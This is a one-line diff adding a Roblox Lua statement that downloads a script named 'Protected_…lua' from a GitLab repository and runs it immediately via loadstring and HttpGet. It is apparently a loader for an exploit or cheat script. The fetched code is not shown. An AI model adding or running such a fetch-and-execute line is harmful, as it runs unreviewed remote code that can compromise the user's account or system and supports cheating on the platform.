@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gitlab.com/D3athFeather/Script/raw/main/Protected_d7ece5fa13af2e5920fb51e9.lua", true))()
